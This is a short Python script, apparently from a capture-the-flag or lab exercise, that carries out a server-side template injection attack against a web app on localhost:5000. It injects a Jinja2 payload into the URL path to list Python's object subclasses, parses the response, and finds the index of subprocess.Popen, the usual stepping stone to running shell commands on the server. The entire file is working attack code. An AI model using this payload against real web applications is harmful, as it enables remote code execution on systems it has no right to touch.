import requests
from bs4 import BeautifulSoup
import urllib

res = requests.get("http://localhost:5000/sdfsd{{''.__class__.__mro__[1].__subclasses__()}}")
content = BeautifulSoup(res.text, 'lxml')
hack = content.find('h3').text.strip('[]').split(',')

for index in range(0, len(hack)):
    if 'subprocess.Popen' in hack[index]:
        print(hack[index], index)

